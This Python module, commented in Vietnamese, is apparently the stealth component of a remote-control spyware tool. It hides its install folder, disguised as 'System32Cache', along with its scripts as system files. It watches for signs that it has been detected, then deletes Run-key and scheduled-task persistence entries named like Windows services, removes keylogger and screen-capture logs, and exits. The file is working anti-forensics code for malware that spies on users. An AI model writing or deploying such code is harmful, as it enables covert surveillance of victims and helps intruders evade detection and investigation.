"""
Module ẩn và tự động xóa dấu vết
"""
import os
import sys
import ctypes
import winreg
import shutil
import subprocess
from pathlib import Path


class StealthManager:
    def __init__(self):
        self.hidden_dir = os.path.join(
            os.environ.get('APPDATA', ''),
            'Microsoft', 'Windows', 'System32Cache'
        )
        # Sử dụng temp trong thư mục ẩn hoặc thư mục hiện tại
        if os.path.exists(self.hidden_dir):
            self.temp_dir = os.path.join(self.hidden_dir, 'temp')
        else:
            from config import TEMP_DIR
            self.temp_dir = TEMP_DIR
    
    def hide_file(self, file_path):
        """Ẩn file"""
        try:
            FILE_ATTRIBUTE_HIDDEN = 0x02
            FILE_ATTRIBUTE_SYSTEM = 0x04
            ctypes.windll.kernel32.SetFileAttributesW(
                file_path,
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
            )
            return True
        except Exception as e:
            print(f"Lỗi khi ẩn file: {e}")
            return False
    
    def hide_directory(self, dir_path):
        """Ẩn thư mục"""
        try:
            FILE_ATTRIBUTE_HIDDEN = 0x02
            FILE_ATTRIBUTE_SYSTEM = 0x04
            ctypes.windll.kernel32.SetFileAttributesW(
                dir_path,
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
            )
            return True
        except Exception as e:
            print(f"Lỗi khi ẩn thư mục: {e}")
            return False
    
    def check_detection(self):
        """Kiểm tra xem có bị phát hiện không"""
        detection_signs = []
        
        # Kiểm tra task manager
        try:
            result = subprocess.run(
                ['tasklist', '/FI', 'IMAGENAME eq python.exe'],
                capture_output=True,
                text=True
            )
            if 'python.exe' in result.stdout:
                # Đếm số process Python
                count = result.stdout.count('python.exe')
                if count > 2:  # Nhiều hơn bình thường
                    detection_signs.append("Nhiều process Python đang chạy")
        except:
            pass
        
        # Kiểm tra network activity (có thể mở rộng)
        # Kiểm tra file log trong temp
        if os.path.exists(self.temp_dir):
            files = os.listdir(self.temp_dir)
            if len(files) > 10:  # Quá nhiều file
                detection_signs.append("Quá nhiều file trong temp")
        
        return detection_signs
    
    def cleanup_traces(self):
        """Xóa tất cả dấu vết"""
        print("🧹 Đang xóa dấu vết...")
        
        # 1. Xóa tất cả file trong temp
        if os.path.exists(self.temp_dir):
            try:
                for file in os.listdir(self.temp_dir):
                    file_path = os.path.join(self.temp_dir, file)
                    try:
                        if os.path.isfile(file_path):
                            os.remove(file_path)
                        elif os.path.isdir(file_path):
                            shutil.rmtree(file_path)
                    except:
                        pass
                print("✅ Đã xóa file trong temp")
            except Exception as e:
                print(f"⚠️  Lỗi khi xóa temp: {e}")
        
        # 2. Xóa registry entries
        self.remove_registry_entries()
        
        # 3. Xóa task scheduler
        self.remove_task_scheduler()
        
        # 4. Xóa log files
        self.remove_log_files()
        
        # 5. Xóa thư mục cài đặt (tùy chọn - có thể comment lại)
        # self.remove_installation_dir()
        
        print("✅ Đã xóa dấu vết")
    
    def remove_registry_entries(self):
        """Xóa entries trong registry"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            # Xóa các entry có thể liên quan
            entries_to_remove = [
                "RemoteControlApp",
                "WindowsUpdateService",
                "System32Cache"
            ]
            
            for entry in entries_to_remove:
                try:
                    winreg.DeleteValue(key, entry)
                    print(f"✅ Đã xóa registry entry: {entry}")
                except FileNotFoundError:
                    pass
            
            winreg.CloseKey(key)
        except Exception as e:
            print(f"⚠️  Lỗi khi xóa registry: {e}")
    
    def remove_task_scheduler(self):
        """Xóa task scheduler"""
        try:
            tasks_to_remove = [
                "WindowsUpdateService",
                "RemoteControlApp"
            ]
            
            for task in tasks_to_remove:
                try:
                    subprocess.run(
                        ['schtasks', '/delete', '/tn', task, '/f'],
                        capture_output=True,
                        check=False
                    )
                    print(f"✅ Đã xóa task: {task}")
                except:
                    pass
        except Exception as e:
            print(f"⚠️  Lỗi khi xóa task scheduler: {e}")
    
    def remove_log_files(self):
        """Xóa tất cả file log"""
        log_patterns = [
            '*.log',
            '*.txt',
            'keylog*',
            'screen_*',
            '*.mp4'
        ]
        
        if os.path.exists(self.temp_dir):
            for pattern in log_patterns:
                try:
                    for file in Path(self.temp_dir).glob(pattern):
                        try:
                            file.unlink()
                        except:
                            pass
                except:
                    pass
    
    def remove_installation_dir(self):
        """Xóa thư mục cài đặt (NGUY HIỂM - chỉ dùng khi cần)"""
        try:
            if os.path.exists(self.hidden_dir):
                shutil.rmtree(self.hidden_dir)
                print(f"✅ Đã xóa thư mục cài đặt: {self.hidden_dir}")
        except Exception as e:
            print(f"⚠️  Lỗi khi xóa thư mục cài đặt: {e}")
    
    def auto_cleanup_on_detection(self):
        """Tự động xóa dấu vết khi phát hiện"""
        detection_signs = self.check_detection()
        
        if detection_signs:
            print("⚠️  PHÁT HIỆN DẤU HIỆU BỊ PHÁT HIỆN!")
            for sign in detection_signs:
                print(f"  - {sign}")
            
            print("\n🔄 Tự động xóa dấu vết...")
            self.cleanup_traces()
            
            # Tự động thoát
            sys.exit(0)
    
    def run_stealth_mode(self):
        """Chạy ở chế độ ẩn"""
        # Ẩn thư mục
        if os.path.exists(self.hidden_dir):
            self.hide_directory(self.hidden_dir)
        
        # Ẩn các file Python
        if os.path.exists(self.hidden_dir):
            for file in os.listdir(self.hidden_dir):
                if file.endswith('.py'):
                    file_path = os.path.join(self.hidden_dir, file)
                    self.hide_file(file_path)
        
        # Kiểm tra và xóa dấu vết định kỳ
        import time
        import threading
        
        def periodic_check():
            while True:
                time.sleep(300)  # Kiểm tra mỗi 5 phút
                self.auto_cleanup_on_detection()
        
        thread = threading.Thread(target=periodic_check, daemon=True)
        thread.start()


if __name__ == "__main__":
    stealth = StealthManager()
    
    print("Chọn chức năng:")
    print("1. Ẩn thư mục và file")
    print("2. Xóa dấu vết")
    print("3. Kiểm tra phát hiện")
    print("4. Chạy chế độ ẩn")
    
    choice = input("\nNhập lựa chọn: ").strip()
    
    if choice == "1":
        if os.path.exists(stealth.hidden_dir):
            stealth.hide_directory(stealth.hidden_dir)
            print("✅ Đã ẩn thư mục")
    elif choice == "2":
        stealth.cleanup_traces()
    elif choice == "3":
        signs = stealth.check_detection()
        if signs:
            print("⚠️  Phát hiện dấu hiệu:")
            for sign in signs:
                print(f"  - {sign}")
        else:
            print("✅ Không phát hiện dấu hiệu")
    elif choice == "4":
        stealth.run_stealth_mode()
        print("Đang chạy ở chế độ ẩn...")
        import time
        time.sleep(60)

